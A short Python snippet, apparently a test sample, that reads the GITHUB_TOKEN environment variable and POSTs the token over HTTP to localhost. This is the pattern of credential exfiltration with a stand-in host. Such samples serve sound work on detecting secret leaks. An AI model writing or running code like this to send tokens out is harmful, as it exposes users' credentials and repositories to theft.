import requests
import os
data = os.getenv("GITHUB_TOKEN")
requests.post('http://localhost', data=data)
